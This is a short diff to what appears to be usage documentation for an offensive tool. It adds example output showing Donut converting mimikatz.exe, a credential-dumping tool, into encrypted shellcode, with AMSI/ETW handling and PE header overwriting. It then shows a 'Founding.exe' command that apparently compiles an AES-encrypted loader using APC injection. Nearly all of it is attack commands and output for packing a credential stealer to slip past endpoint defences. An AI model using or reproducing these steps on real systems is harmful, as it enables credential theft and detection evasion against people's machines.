@@ -42,6 +42,19 @@ donut.exe --input:mimikatz.exe --output:mimi.bin
 ### Example Command
 ```bash
 donut.exe --input:mimikatz.exe --output:mimi.bin
+...
+[ Donut shellcode generator v1 (built Mar  3 2023 13:33:22)
+  [ Copyright (c) 2019-2021 TheWover, Odzhan
+
+  [ Instance type : Embedded
+  [ Module file   : "mimikatz.exe"
+  [ Entropy       : Random names + Encryption
+  [ File type     : EXE
+  [ Target CPU    : x86+amd64
+  [ AMSI/WDLP/ETW : continue
+  [ PE Headers    : overwrite
+  [ Shellcode     : "mimi.bin"
+  [ Exit          : Thread
 ```
 ```bash
 Founding.exe mimi.bin aes APC --compile
